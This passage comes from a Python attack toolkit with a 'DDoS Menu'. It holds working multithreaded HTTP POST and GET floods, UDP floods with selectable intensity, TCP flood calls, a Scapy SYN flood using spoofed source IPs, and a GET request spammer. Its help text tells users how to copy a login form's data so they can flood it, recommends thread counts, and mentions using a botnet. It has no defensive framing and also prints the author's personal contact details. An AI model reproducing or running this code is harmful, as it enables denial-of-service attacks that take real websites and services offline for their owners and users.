                                print("\n" + Fore.BLUE + "For the post request to start the attack you need too (this is for the post request) :" + "\n" + Fore.BLUE + "1. first go to the target and go to inspect" + "\n" + Fore.BLUE + "2. you put random data on the login page, then press f12 go to the network tab, then you make the request and go to the file that has the post method and scroll down untill you see the form data (if the target has an id, token, rechaptcha token or anything else the attack will not work)" + "\n" + Fore.BLUE + "3. you paste what it is in the form data, then go into the program and paste the form data in to the variable named data like this: data = {'rcr_authenticate': '1', 'rcr_user': 'dfssf', 'rcr_pass': 'sdfsfs', 'rcr_submit': 'Conectare'} (this is an example)" + "\n" + Fore.BLUE + "4. You run the app, you put the url you saw on the network which will be the target url, you put how many threads you want for the attack and start it:)")

                            if command1 == "cls":
                                try:
                                    os.system("cls")
                                except:
                                    os.system("clear")

                        except KeyboardInterrupt:
                            exit()

                if tool3 == "12":
                    print(
                        Fore.GREEN + 
                        """
                         ____  ____       ____    __  __
                        |  _ \|  _ \  ___/ ___|  |  \/  | ___ _ __  _   _ 
                        | | | | | | |/ _ \___ \  | |\/| |/ _ \ '_ \| | | |
                        | |_| | |_| | (_) |__) | | |  | |  __/ | | | |_| | ~>DDoS Menu<~
                        |____/|____/ \___/____/  |_|  |_|\___|_| |_|\__,_|~~>Made by tfwcodes(github)<~~


                        """
                        )
                    while True:
                        try:
                            print("\n" + Fore.BLUE + "[1] req flood" + "\n" + Fore.BLUE + "[2] Udp Flood" + "\n" + Fore.BLUE + "[3] Tcp Flood" + Fore.BLUE + "\n" +  "[4] Syn Flood Attack" + "\n" + Fore.BLUE + "[5] GET request spammer" + "\n")
                            tool_acces = input(Fore.GREEN + "[+] Enter the tool you want to acces: ")
                            if tool_acces == "1":
                                try:
                                    # Banner
                                    print(
                                        Fore.GREEN + 
                                        """
                                                          __ _                 _ 
                                        _ __ ___  __ _   / _| | ___   ___   __| |
                                        | '__/ _ \/ _` | | |_| |/ _ \ / _ \ / _` |
                                        | | |  __/ (_| | |  _| | (_) | (_) | (_| |   ~>Request flooding app<~
                                        |_|  \___|\__, | |_| |_|\___/ \___/ \__,_|  ~~>Made by tfwcodes(github)<~~
                                                    |_|                          
                                       """
                                        )
                                    while True:
                                        try:
                                            # req_post for post req, req_get for get request
                                            print("\n" + Fore.BLUE + "[!] 'req_post' for multiple denied POST req [MOST EFICIENT/FASTEST] " + "\n" + Fore.BLUE + "[!] 'req_get' for multiple denied GET req [LIGHTER ONE]" + "\n")
                                            what = input("[+] What service do you want to use: ")
                                            # If the user uses the service 'req_post' it will start the req flood with the method post
                                            if what == "req_post":
                                                while True:
                                                    try:
                                                        # Help menu
                                                        print(
                                                          "\n" + Fore.BLUE + "[!] Enter recommended_threads to see how many threads are recommended for an ordinary pc" + "\n" + Fore.BLUE + "[!] Enter attack_info to see info about how to start the attack (you might wanna see this if you never tested the app)" + "\n" + Fore.BLUE + "[!] Enter start_attack to start the attack" + "\n" + Fore.BLUE + "[!] Enter cls to clear the screen" + "\n" + Fore.BLUE + "[!] Enter dev to see how to reach me" + "\n" + Fore.BLUE + "[!] Enter response_info to see info about what response you get" + "\n" + Fore.BLUE + "[!] If you want to exit press Ctrl+C(if you press while the attack is running it will not work)" + "\n")
                                                        # It will make a while loop that prints the help menu and asks you to enter a command
                                                        command = input(Fore.GREEN + "[+] Enter a command: ")
                                                        # The initial dos/DDoS attack
                                                        if command == "start_attack":
                                                            try:
                                                                # Enter target url
                                                                url = input(Fore.GREEN + "[+] Enter the target url: ")
                                                                # Enter the number of threads that will be used in the attack
                                                                number_of_threads = input(Fore.GREEN + "[+] Enter the number of threads: ")
                                                                print(Fore.GREEN + "[!]-----> 0%")
                                                                time.sleep(2)
                                                                print(Fore.GREEN + "[!]-----> 25%")
                                                                time.sleep(2)
                                                                print(Fore.GREEN + "[!]-----> 50%")
                                                                time.sleep(2)
                                                                print(Fore.GREEN + "[!]-----> 100%")
                                                                time.sleep(1)
                                                                print(Fore.GREEN + "[!] The attack is going")
                                                                # Form data
                                                                data = {
                                                                    'rcr_authenticate': '1',
                                                                    'rcr_user': 'E-mail',
                                                                    'rcr_pass': 'Password',
                                                                    'rcr_submit': 'Conectare'
                                                                }
                                                                # The list of threads were all the threads are gonna be append
                                                                list_of_threads = []
                                                                # Make the while loop request with the method post
                                                                def flood():
                                                                    while True:
                                                                        response = requests.post(url, data=data)
                                                                        print(response)
                                                                # The multi-threading part
                                                                # It will have number_of_threads(this is the variable that asks you for the number of threads) threads for this attack
                                                                for i in range(int(number_of_threads)):
                                                                    # The multi-threading will have the target flood(where is the while loop request)
                                                                    t = threading.Thread(target=flood)
                                                                    t.daemon = True
                                                                    # t will be append in the list of threads (named list_of_threads)
                                                                    list_of_threads.append(t)
                                                                for i in range(int(number_of_threads)):
                                                                    # Start the threads
                                                                    list_of_threads[i].start()
                                                                for i in range(int(number_of_threads)):
                                                                    # Join the threads
                                                                    list_of_threads[i].join()
                                                            except KeyboardInterrupt:
                                                                exit()
                                                        if command == "attack_info":
                                                            try:
                                                                # Print i   nfo about how to start the attack
                                                                print(
                                                                    "\n" + Fore.BLUE + "to start the attack you need too:" + "\n" + Fore.BLUE + "1. first go to the target and go to inspect" + "\n" + Fore.BLUE + "2. you put random data on the login page, then press f12 go to the network tab, then you make the request and go to the file that has the post method and scroll down untill you see the form data (if the target has an id, token, rechaptcha token or anything else the attack will not work)" + "\n" + Fore.BLUE + "3. you paste what it is in the form data, then go into the program and paste the form data in to the variable named data like this: data = {'rcr_authenticate': '1', 'rcr_user': 'dfssf', 'rcr_pass': 'sdfsfs', 'rcr_submit': 'Conectare'} (this is an example)" + "\n" + Fore.BLUE + "4. You run the app, you put the url you saw on the network which will be the target url, you put how many threads you want for the attack and start it:)")
                                                            except:
                                                                pass
                                                        if command == "recommended_threads":
                                                            try:
                                                                # Print the recommended threads
                                                                print(
                                                                   "\n" +  Fore.BLUE + "The recommended threads for an ordinary pc are between 50-300 and if you have a powerful pc then the recommended threads are between 300-700" + "\n")
                                                            # If there will be any error it will print an error occurred
                                                            except:
                                                                print(Fore.BLUE + "[!!!] An error occurred")
                                                        # How to reach me (my discord and gmail)
                                                        if command == "dev":
                                                            try:
                                                                print("\n" + Fore.BLUE + "Discord: tfw#2946, Gmail: mungureanuu@gmail.com")
                                                            except:
                                                                print(Fore.BLUE + "[!!!] An error occurred")
                                                        # Print info about the response
                                                        if command == "response_info":
                                                            try:
                                                                print(
                                                                  "\n" + Fore.BLUE + "If you start the attack and you get response 200 that means that the attack is succesfull and is working, if you get something else you can see more info about it  here: https://developer.mozilla.org/en-US/docs/Web/HTTP/Status" + "\n")
                                                            except:
                                                                print(Fore.BLUE + "[!!!]An error occurred")
                                                        if command == "cls":
                                                            try:
                                                                # If the user is on windows it will execute the command cls, else If the user uses any other operating system it will execute the command clear
                                                                os.system('cls')
                                                            except:
                                                                os.system("clear")
                                                    except KeyboardInterrupt:
                                                        exit()
                                            # Else if the user uses the service 'req_get' it will start the req flood with the method get
                                            if what == "req_get":
                                                while True:
                                                        try:
                                                            print("\n" + Fore.BLUE + "[!] Enter start_dos to start the attack" +"\n" + Fore.BLUE + "[!] Enter dev_me to see how to reach me" + "\n" + Fore.BLUE + "[!] Enter resp_info to see info about the response of your attack" + "\n" + Fore.BLUE + "[!] Enter cls to clear the screen" + "\n") 
                                                            command_2 = input("[+] Enter a command: ")
                                                            if command_2 == "start_dos":
                                                                try:
                                                                    # Url target
                                                                    url_target_2 = input(Fore.GREEN + "[+] Enter the url target: ")
                                                                    # Number of threads
                                                                    number_of_threads_2 = input(Fore.GREEN + "[+] Enter the number of threads for the attack: ")
                                                                    print(Fore.GREEN + "[!]-----> 0%")
                                                                    time.sleep(2)
                                                                    print(Fore.GREEN + "[!]-----> 25%")
                                                                    time.sleep(2)
                                                                    print(Fore.GREEN + "[!]-----> 50%")
                                                                    time.sleep(2)
                                                                    print(Fore.GREEN + "[!]-----> 100%")
                                                                    time.sleep(1)
                                                                    print(Fore.GREEN + "[!] The attack is going")
                                                                    # Request sessiom
                                                                    ses = requests.session()
                                                                    # Do a while loop with a get request and then print the response
                                                                    def do_req():
                                                                        while True:
                                                                            r = ses.get(url_target_2)
                                                                            print(r)
                                                                    # The list of threads
                                                                    threads_2 = []
                                                                    # Start the multithreading
                                                                    for i in range(int(number_of_threads_2)):
                                                                        t = threading.Thread(target=do_req)
                                                                        t.daemon  = True
                                                                        threads_2.append(t)
                                                                    for i in range(int(number_of_threads_2)):
                                                                        # Start the threads
                                                                        threads_2[i].start()
                                                                    for i in range(int(number_of_threads_2)):
                                                                        # Join the threads
                                                                        threads_2[i].join()
                                                                except KeyboardInterrupt:
                                                                    exit()
                                                            if command_2 == "dev_me":
                                                                try:
                                                                    # My social platforms
                                                                    print("\n" + Fore.BLUE + "Discord: tfw#2946, Gmail: mungureanuu@gmail.com")
                                                                except:
                                                                    print(Fore.BLUE + "[!!!]An error occurred")
                                                            if command_2 == "resp_info":
                                                                try:
                                                                    # info about the response 
                                                                    print("\n" + Fore.BLUE + "If you start the attack and you get response 200 that means that the attack is succesfull and is working, if you get something else you can see more info here: https://developer.mozilla.org/en-US/docs/Web/HTTP/Status" + "\n")
                                                                except:
                                                                    print(Fore.BLUE + "[!!!] An error occurred")
                                                            if command_2 == "cls":
                                                                try:
                                                                    # If the user is on windows it will execute the command cls, else If the user uses any other operating system it will execute the command clear
                                                                    os.system('cls')
                                                                except:
                                                                    os.system('clear')
                                                        except KeyboardInterrupt:
                                                            exit()
                                        except KeyboardInterrupt:
                                            exit()                    
                                except KeyboardInterrupt:
                                    exit()

                            if tool_acces == "2":
                                try:
                                    print(
                                    Fore.GREEN + 
                                    """
                                    _   _     _         _____ _                 _ 
                                   | | | | __| |_ __   |  ___| | ___   ___   __| |
                                   | | | |/ _` | '_ \  | |_  | |/ _ \ / _ \ / _` |  ~>Udp Flood<~
                                   | |_| | (_| | |_) | |  _| | | (_) | (_) | (_| | ~~>Made by tfwcodes(github)<~~
                                    \___/ \__,_| .__/  |_|   |_|\___/ \___/ \__,_|
                                               |_|
                                    """
                                )
                                    while True:
                                        try:
                                            print("\n" + Fore.BLUE + "[!] Enter udp_flood to start the udp flood" + "\n" + Fore.BLUE + "[!] Enter udp_info to see info about the attack (you might wanna see this if you never tested the app)" + "\n" + Fore.BLUE + "[!] Enter cls to clear the screen" + "\n")
                                            cmnd  = input("[+] Enter a command: ")
                                            if cmnd == "udp_flood":
                                                try:
                                                    ip2 = input(Fore.GREEN + "[+] Enter the target ip address: ")
                                                    try:
                                                        # if the ip is valid it will print that the ip is valid
                                                        print(ipaddress.ip_address(ip2))
                                                        print(Fore.BLUE + "[!] The ip is valid")
                                                        # Except if the ip is not valid
                                                    except:
                                                        # It will print the ip is not valid
                                                        print(Fore.BLUE + "[-] The ip is not valid")
                                                    port2 = input(Fore.GREEN + "[+] Enter the port you want to attack: ")
                                                    data = input(Fore.GREEN + "[+] Enter the data you want to send: ")
                                                    threads_6 = input(Fore.GREEN + "[+] Enter the number of threads: ")
                                                    powerful = input(Fore.GREEN + "[+] Enter how powerful do you want the attack to be (1[THE LIGHTER ONE] - 5 [THE MOST POWERFUL ONE] : ")
                                                    if powerful == "1":
                                                        try:
                                                            print(Fore.GREEN + "[!]-----> 0%")
                                                            time.sleep(2)
                                                            print(Fore.GREEN + "[!]-----> 25%")
                                                            time.sleep(2)
                                                            print(Fore.GREEN + "[!]-----> 50%")
                                                            time.sleep(2)
                                                            print(Fore.GREEN + "[!]-----> 100%")
                                                            time.sleep(1)
                                                            print(Fore.GREEN + "[!] The attack is going")
                                                            def UDP():
                                                                while True:
                                                                    try:
                                                                        # SOCK_DGRAM is for udp
                                                                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                                                        # Str the ip and int the port
                                                                        addr = (str(ip2), int(port2))
                                                                        # send to the varaiable addr the data and encoded with utf-8
                                                                        sock.sendto(data.encode("utf-8"), addr)
                                                                    except:
                                                                        print(Fore.BLUE + "[!!!] An error occurred")
                                                            # The list of threads
                                                            threads_7 = []
                                                            #start the multi threading with the threads (threads_6)
                                                            for i in range(int(threads_6)):
                                                                # the target is the udp flood attack
                                                                t = threading.Thread(target=UDP)
                                                                # t.daemon is True
                                                                t.daemon = True
                                                                # append t to the list of threads
                                                                threads_7.append(t)
                                                            for i in range(int(threads_6)):
                                                                # Start the threads
                                                                threads_7[i].start()
                                                            for i in range(int(threads_6)):
                                                                # join the threads
                                                                threads_7[i].join()
                                                        except KeyboardInterrupt:
                                                            exit()
                                                    if powerful == "2":
                                                        try:
                                                            print(Fore.GREEN + "[!]-----> 0%")
                                                            time.sleep(2)
                                                            print(Fore.GREEN + "[!]-----> 25%")
                                                            time.sleep(2)
                                                            print(Fore.GREEN + "[!]-----> 50%")
                                                            time.sleep(2)
                                                            print(Fore.GREEN + "[!]-----> 100%")
                                                            time.sleep(1)
                                                            print(Fore.GREEN + "[!] The attack is going")
                                                            def UDP():
                                                                while True:
                                                                    try:
                                                                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                                                        sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                                                        #string the ip addres and int port
                                                                        addrs = (str(ip2), int(port2))
                                                                        # Send the data
                                                                        sock.sendto(data.encode("utf-8"), addrs)
                                                                        sock2.sendto(data.encode("utf-8"), addrs)
                                                                    except:
                                                                        print(Fore.BLUE + "[!!!] An error occurred")
                                                            threads_8 = []
                                                            for i in range(int(threads_6)):
                                                                t = threading.Thread(target=UDP)
                                                                t.daemon  = True
                                                                threads_8.append(t)
                                                            for i in range(int(threads_6)):
                                                                threads_8[i].start()
                                                            for i in range(int(threads_6)):
                                                                threads_8[i].join()
                                                        except KeyboardInterrupt:
                                                            exit()

                                                    if powerful == "3":
                                                        try:
                                                            print(Fore.GREEN + "[!]-----> 0%")
                                                            time.sleep(2)
                                                            print(Fore.GREEN + "[!]-----> 25%")
                                                            time.sleep(2)
                                                            print(Fore.GREEN + "[!]-----> 50%")
                                                            time.sleep(2)
                                                            print(Fore.GREEN + "[!]-----> 100%")
                                                            time.sleep(1)
                                                            print(Fore.GREEN + "[!] The attack is going")
                                                            def UDP():
                                                                while True:
                                                                    try:
                                                                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                                                        sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                                                        sock3 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                                                        addrs = (str(ip2), int(port2))
                                                                        sock.sendto(data.encode("utf-8"), addrs)
                                                                        sock2.sendto(data.encode("utf-8"), addrs)
                                                                        sock3.sendto(data.encode("utf-8"), addrs)
                                                                    except:
                                                                        print(Fore.BLUE + "[!!! An error occurred")
                                                            threads_9 = []
                                                            for i in range(int(threads_6)):
                                                                t = threading.Thread(target=UDP)
                                                                t.daemon = True
                                                                threads_9.append(t)

                                                            for i in range(int(threads_6)):
                                                                threads_9[i].start()

                                                            for i in range(int(threads_6)):
                                                                threads_9[i].join()
                                                        except KeyboardInterrupt:
                                                            exit()
                                                    if powerful == "4":
                                                        try:
                                                            print(Fore.GREEN + "[!]-----> 0%")
                                                            time.sleep(2)
                                                            print(Fore.GREEN + "[!]-----> 25%")
                                                            time.sleep(2)
                                                            print(Fore.GREEN + "[!]-----> 50%")
                                                            time.sleep(2)
                                                            print(Fore.GREEN + "[!]-----> 100%")
                                                            time.sleep(1)
                                                            print(Fore.GREEN + "[!] The attack is going")
                                                            def UDP():
                                                                while True:
                                                                    try:
                                                                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                                                        sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                                                        sock3 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                                                        sock4 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                                                        addrs = (str(ip2), int(port2))
                                                                        sock.sendto(data.encode("utf-8"), addrs)
                                                                        sock2.sendto(data.encode("utf-8"), addrs)
                                                                        sock3.sendto(data.encode("utf-8"), addrs)
                                                                        sock4.sendto(data.encode("utf-8"), addrs)
                                                                    except:
                                                                        print(Fore.BLUE + "[!!! An error occurred")
                                                            threads_9 = []
                                                            for i in range(int(threads_6)):
                                                                t = threading.Thread(target=UDP)
                                                                t.daemon = True
                                                                threads_9.append(t)
                                                            for i in range(int(threads_6)):
                                                                threads_9[i].start()
                                                            for i in range(int(threads_6)):
                                                                threads_9[i].join()
                                                        except KeyboardInterrupt:
                                                            exit()

                                                    if powerful == "5":
                                                        try:
                                                            print(Fore.GREEN + "[!]-----> 0%")
                                                            time.sleep(2)
                                                            print(Fore.GREEN + "[!]-----> 25%")
                                                            time.sleep(2)
                                                            print(Fore.GREEN + "[!]-----> 50%")
                                                            time.sleep(2)
                                                            print(Fore.GREEN + "[!]-----> 100%")
                                                            time.sleep(1)
                                                            print(Fore.GREEN + "[!] The attack is going")
                                                            def UDP():
                                                                while True:
                                                                    try:
                                                                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                                                        sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                                                        sock3 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                                                        sock4 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                                                        sock5 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                                                        addrs = (str(ip2), int(port2))
                                                                        sock.sendto(data.encode("utf-8"), addrs)
                                                                        sock2.sendto(data.encode("utf-8"), addrs)
                                                                        sock3.sendto(data.encode("utf-8"), addrs)
                                                                        sock4.sendto(data.encode("utf-8"), addrs)
                                                                        sock5.sendto(data.encode("utf-8"), addrs)
                                                                    except:
                                                                        print(Fore.BLUE + "[!!! An error occurred")
                                                            threads_9 = []
                                                            for i in range(int(threads_6)):
                                                                t = threading.Thread(target=UDP)
                                                                t.daemon = True
                                                                threads_9.append(t)
                                                            for i in range(int(threads_6)):
                                                                threads_9[i].start()
                                                            for i in range(int(threads_6)):
                                                                threads_9[i].join()
                                                        except KeyboardInterrupt:
                                                            exit()
                                                except KeyboardInterrupt:
                                                    exit()
                                            if cmnd == "udp_info":
                                                try:
                                                    # Info about the udp flood
                                                    print("\n" + Fore.BLUE + "[!!!] WARNING - Do not use unless you have a very powerful pc or botnet! " + "\n" + Fore.BLUE + "[!!!] WARNING - If the target doesn't have the port you want to attack open, then you will flood yourself" + "\n")
                                                except KeyboardInterrupt:
                                                    exit()
                                            if cmnd == "cls":
                                                try:
                                                    os.system("cls")
                                                except:
                                                    os.system("clear")
                                        except KeyboardInterrupt:
                                            exit()         
                                except KeyboardInterrupt:
                                    exit()
                            if tool_acces == "3":
                                try:
                                    print(
                                        Fore.GREEN + 
                                        """

                                         _____            _____ _                 _ 
                                        |_   _|__ _ __   |  ___| | ___   ___   __| |
                                          | |/ __| '_ \  | |_  | |/ _ \ / _ \ / _` | ~>Tcp Flood Tool<~
                                          | | (__| |_) | |  _| | | (_) | (_) | (_| |~~>Made by tfwcodes(github)<~~
                                          |_|\___| .__/  |_|   |_|\___/ \___/ \__,_|

                                        """
                                    )
                                    while True:
                                        try:
                                            print("\n" + Fore.BLUE + "[!] Enter tcp_flood to start the tcp flood" + "\n" + Fore.BLUE + "[!] Enter tcp_info to see info about the attack (you might wanna see this if you never tested the app)"  + "\n" + Fore.BLUE + "[!] Enter cls to clear the screen")
                                            cmnd2 = input(Fore.GREEN + "[+] Enter a command: ")
                                            if cmnd2 == "tcp_flood":
                                                try:
                                                    ip3 = str(input(Fore.GREEN + "[+] Enter the target ip address: "))
                                                    try:
                                                        # if the ip is valid it will print that the ip is valid
                                                        print(ipaddress.ip_address(ip3))
                                                        print(Fore.BLUE + "[!] The ip is valid")
                                                        # Except if the ip is not valid
                                                    except:
                                                        # It will print the ip is not valid
                                                        print(Fore.BLUE + "[-] The ip is not valid")
                                                    port3 = int(input(Fore.GREEN + "[+] Enter the port you want to attack: "))
                                                    data3 = input(Fore.GREEN + "[+] Enter the data you want to send: ")
                                                    numbr_threads = input(Fore.GREEN + "[+] Enter the number of threads: ")
                                                    powerful1 = input(Fore.GREEN + "[+] Enter how powerful do you want the attack to be (1[LIGHTER ONE] / 5 [STRONGEST/FASTEST] ): ")
                                                    if powerful1 == "1":
                                                        try:
                                                            print(Fore.GREEN + "[!]-----> 0%")
                                                            time.sleep(2)
                                                            print(Fore.GREEN + "[!]-----> 25%")
                                                            time.sleep(2)
                                                            print(Fore.GREEN + "[!]-----> 50%")
                                                            time.sleep(2)
                                                            print(Fore.GREEN + "[!]-----> 100%")
                                                            time.sleep(1)
                                                            print(Fore.GREEN + "[!] The attack is going")
                                                            tcp_flood()
                                                        except KeyboardInterrupt:
                                                            exit()
                                                    if powerful1 == "2":
                                                        try:
                                                            print(Fore.GREEN + "[!]-----> 0%")
                                                            time.sleep(2)
                                                            print(Fore.GREEN + "[!]-----> 25%")
                                                            time.sleep(2)
                                                            print(Fore.GREEN + "[!]-----> 50%")
                                                            time.sleep(2)
                                                            print(Fore.GREEN + "[!]-----> 100%")
                                                            time.sleep(1)
                                                            print(Fore.GREEN + "[!] The attack is going")
                                                            tcp_flood_1()
                                                        except KeyboardInterrupt:
                                                            exit()
                                                    if powerful1 == "3":
                                                        try:
                                                            print(Fore.GREEN + "[!]-----> 0%")
                                                            time.sleep(2)
                                                            print(Fore.GREEN + "[!]-----> 25%")
                                                            time.sleep(2)
                                                            print(Fore.GREEN + "[!]-----> 50%")
                                                            time.sleep(2)
                                                            print(Fore.GREEN + "[!]-----> 100%")
                                                            time.sleep(1)
                                                            print(Fore.GREEN + "[!] The attack is going")
                                                            tcp_flood_3()
                                                        except KeyboardInterrupt:
                                                            exit()
                                                    if powerful1 == "4":
                                                        try:
                                                            print(Fore.GREEN + "[!]-----> 0%")
                                                            time.sleep(2)
                                                            print(Fore.GREEN + "[!]-----> 25%")
                                                            time.sleep(2)
                                                            print(Fore.GREEN + "[!]-----> 50%")
                                                            time.sleep(2)
                                                            print(Fore.GREEN + "[!]-----> 100%")
                                                            time.sleep(1)
                                                            print(Fore.GREEN + "[!] The attack is going")
                                                            tcp_flood_4()
                                                        except KeyboardInterrupt:
                                                            exit()
                                                    if powerful1 == "5":
                                                        try:
                                                            print(Fore.GREEN + "[!]-----> 0%")
                                                            time.sleep(2)
                                                            print(Fore.GREEN + "[!]-----> 25%")
                                                            time.sleep(2)
                                                            print(Fore.GREEN + "[!]-----> 50%")
                                                            time.sleep(2)
                                                            print(Fore.GREEN + "[!]-----> 100%")
                                                            time.sleep(1)
                                                            print(Fore.GREEN + "[!] The attack is going")
                                                            tcp_flood_5()
                                                        except KeyboardInterrupt:
                                                            exit()
                                                except KeyboardInterrupt:
                                                    exit()
                                        except KeyboardInterrupt:
                                            exit()
                                except KeyboardInterrupt:
                                    exit()
                            if tool_acces == "4":
                                try:
                                    # The banner
                                    print(
                                        Fore.GREEN + 
                                     """
                                      ______   ___   _   _____ _                 _      _   _   _             _    
                                     / ___\ \ / / \ | | |  ___| | ___   ___   __| |    / \ | |_| |_ __ _  ___| |__
                                     \___ \  V /|  \| | | |_  | |/ _ \ / _ \ / _` |    / _ \| __| __/ _` |/ __| |/ 
                                      ___) || | | |\  | |  _| | | (_) | (_) | (_| |  / ___ \ |_| || (_| | (__|   <   ~>Syn Flood Attack<~
                                     |____/ |_| |_| \_| |_|   |_|\___/ \___/ \__,_| /_/   \_\__|\__\__,_|\___|_|\_  ~~>Made by tfwcodes(github)<~~
                                     """
                                    )
                                    while True:
                                        try:
                                            print("\n" + Fore.BLUE + "[!] Entet start_syn to start the syn flood attack" + "\n" + Fore.BLUE + "[!] Enter syn_info (you might wanna see this if you never tested the app)" + "\n" + Fore.BLUE + "[!] Enter cls to clear the screen" + "\n")
                                            command_3 = input("[+] Enter a command: ")
                                            if command_3 == "start_syn":
                                                try:
                                                    how = input(Fore.GREEN + "[+] How much powerfull do you want the attack to be ( 1[THE LIGHTER ONE] - 2[THE MOST POWERFUL/FASTEST] ) : ")
                                                    # If the user uses the option 1 it will do the lighter attack
                                                    if how == "1":
                                                        try:
                                                            # It will have 3 params (ip_addres which is the target IP addres + sport which stands for the source port + dport which is the destination port)
                                                            def tcp_flood(ip_adddres, sport, dport):
                                                            	# the soruce addres will be a random ip
                                                            	s_addr = RandIP()
                                                            	# The destination addres
                                                            	d_addr = ip_adddres
        
                                                            	# The packet that will be send it will have the source addres the variable s_addr, dst it s the destination addres, the source port, the destination port, the sequence will be 200000, and for the attack to be a SYN attack we need to specify that the flag = S
                                                            	packet = IP(src=s_addr, dst=d_addr)/TCP(sport=sport, dport=dport, seq=200000, flags="S")
                                                            	# Send the packet
                                                            	send(packet)
        
                                                            # Asks for the ip
                                                            ip = str(input(Fore.GREEN + "[+] Enter the target ip addres: "))
                                                            # The port
                                                            port = int(input(Fore.GREEN + "[+] Enter the port you want to attack: "))
        
                                                            def syn2_flood():
                                                                # Because we want to send an infinite  packet we need to have a while loop
                                                                while True:
                                                                	try:
                                                                		tcp_flood(ip, 1234, port)	
                                                                	# if an error occurres it will print that
                                                                	except:
                                                                		print(Fore.BLUE + "[!!!] An error occurred")
        
                                                            nubmer_of_threads_3 = input(Fore.GREEN + "[+] Enter the number of threads: ")
        
                                                            threads_5 = []
        
                                                            for i in range(int(nubmer_of_threads_3)):
                                                                t = threading.Thread(target=syn2_flood)
                                                                t.daemon = True
                                                                threads_5.append(t)
                                                            
                                                            for i in range(int(nubmer_of_threads_3)):
                                                                threads_5[i].start()
                                                            
                                                            for i in range(int(nubmer_of_threads_3)):
                                                                threads_5[i].join()
                                                        except KeyboardInterrupt:
                                                            exit()
                                                            
                                                    # If the user uses option 2 then it will do the more powerful version of the attack
                                                    if how == "2":
                                                        try:
                                                            # It will have 3 params (ip_addres which is the target IP addres + sport which stands for the source port + dport which is the destination po
                                                            def tcp_flood(ip_adddres, sport, dport):
                                                            	# the soruce addres will be a random ip
                                                            	s_addr = RandIP()
                                                            	# The destination addres
                                                            	d_addr = ip_adddres
                                                            	# The packet that will be send it will have the source addres the variable s_addr, dst it s the destination addres, the source port, the 
                                                            	packet = IP(src=s_addr, dst=d_addr)/TCP(sport=sport, dport=dport, seq=200000, flags="S")
                                                            	# Send the packet
                                                            	send(packet)
                                                            def tcp_flood_2(ip_adddres_2, sport_2, dport_2):
                                                            	# the soruce addres will be a random ip
                                                            	s_addr = RandIP()
                                                            	# The destination addres
                                                            	d_addr = ip_adddres_2
                                                            	# The packet that will be send it will have the source addres the variable s_addr, dst it s the destination addres, the source port, the 
                                                            	packet = IP(src=s_addr, dst=d_addr)/TCP(sport=sport_2, dport=dport_2, seq=200000, flags="S")
                                                            	# Send the packet
                                                            	send(packet)
                                                            # Asks for the ip
                                                            ip = str(input(Fore.GREEN + "[+] Enter the target ip addres: "))
                                                            # The port
                                                            port = int(input(Fore.GREEN + "[+] Enter the port you want to attack: "))
                                                            # Because we want to send an infinite  packet we need to have a while loop
                                                            def syn_flood():
                                                                while True:
                                                                	try:
                                                                		tcp_flood_2(ip, 1234, port)
                                                                		tcp_flood(ip, 1234, port)	
                                                                	# if an error occurres it will print that
                                                                	except:
                                                                		print(Fore.BLUE + "[!!!] An error occurred")
                                                            threads_4 = []
                                                            
                                                            number_of_threads_4 = input(Fore.GREEN + "[+] Enter the number of threads: ")
        
                                                            for i in range(int(number_of_threads_4)):
                                                                t = threading.Thread(target=syn_flood)
                                                                t.daemon = True
                                                                threads_4.append(t)
                                                            for i in range(50):
                                                                threads_4[i].start()
        
                                                            for i in range(int(number_of_threads_4)):
                                                                threads_4[i].join()    
                                                                    
                                                        except KeyboardInterrupt:
                                                            exit()
                                                except KeyboardInterrupt:
                                                    exit()    
                                            #If the user uses the command req_info then it will print all the warnings                                                                                                                                           
                                            if command_3 == "syn_info":
                                                try:
                                                    print("\n" + Fore.BLUE + "[!!!] WARNING - Do not use unless you have a very powerful pc or botnet! " + "\n" + Fore.BLUE + "[!!!] WARNING - If the target doesn't have the port you want to attack open, then you will dos yourself"+ "\n")
                                                except KeyboardInterrupt:
                                                    exit()
                                        
                                        except KeyboardInterrupt:
                                            exit()
                                except KeyboardInterrupt:
                                    exit()

                            if tool_acces == "5":
                                try:
                                    # banner
                                    print(
                                        Fore.GREEN + 
                                        """
                                          ____ _____ _____                                  _   
                                         / ___| ____|_   _|  _ __ ___  __ _ _   _  ___  ___| |_ 
                                        | |  _|  _|   | |   | '__/ _ \/ _` | | | |/ _ \/ __| __|
                                        | |_| | |___  | |   | | |  __/ (_| | |_| |  __/\__ \ |_ 
                                         \____|_____| |_|   |_|  \___|\__, |\__,_|\___||___/\__|
                                                                         |_|
                                                                                                    ~>GET request spammer<~
                                         ___ _ __   __ _ _ __ ___  _ __ ___   ___ _ __             ~~>Made by tfwcodes(github)<~~
                                        / __| '_ \ / _` | '_ ` _ \| '_ ` _ \ / _ \ '__|
                                        \__ \ |_) | (_| | | | | | | | | | | |  __/ |   
                                        |___/ .__/ \__,_|_| |_| |_|_| |_| |_|\___|_|   
                                            |_|
                                        """
                                    )
                                    

                                    target_url = input(Fore.GREEN + "[+] Enter the target url: ")
                                    threads_numbr = input(Fore.GREEN + "[+] Enter the number of threads: ")

                                    # Do the request
                                    def do_get_request():
                                        class Getrequest:
                                            while True:
                                                ses6 = requests.session()
                                                response1 = ses6.get(target_url)
                                                respose2 = urlopen(target_url)
                                                response3 = requests.get(target_url)
                                                print(response1)
                                                print(respose2.status)
                                                print(response3)

                                    
                                    list_of_thrds = []

                                    class HTTPThread:
                                        for i in range(int(threads_numbr)):
                                            t = threading.Thread(target=do_get_request)
                                            t.daemon = True
                                            list_of_thrds.append(t)

                                        for i in range(int(threads_numbr)):
                                            list_of_thrds[i].start()

